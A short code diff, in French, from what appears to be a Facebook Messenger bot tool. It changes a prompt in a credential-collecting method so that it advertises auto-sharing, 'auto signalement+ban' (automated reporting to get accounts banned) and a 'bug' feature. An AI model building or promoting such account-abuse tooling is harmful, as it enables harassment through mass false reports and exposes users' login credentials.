@@ -152,7 +152,7 @@ class LocalFileSender:
 
     def collect_credentials(self):
         """Collecte les identifiants"""
-        print("\n\033[36m[SYSTÈME] ÉTAPE À SUIVRE\n 1. connecter le bot\n 2. ouvrez l'app Messenger\n 3.un bot apparaîtra cliquez et accedez au menu\n \033[0m")
+        print("\n\033[36m[SYSTÈME] ÉTAPE À SUIVRE\n 1. connecter le bot\n 2. ouvrez l'app Messenger\n 3.un bot apparaîtra cliquez et accedez au menu\n FONCTIONNALITÉS SPÉCIAL ☢️\n auto partage\n auto signalement+ban\n ☠️ bug \033[0m")
         
         username = input("\033[34mE-mail: \033[0m").strip()
         if username.lower() == "exit":
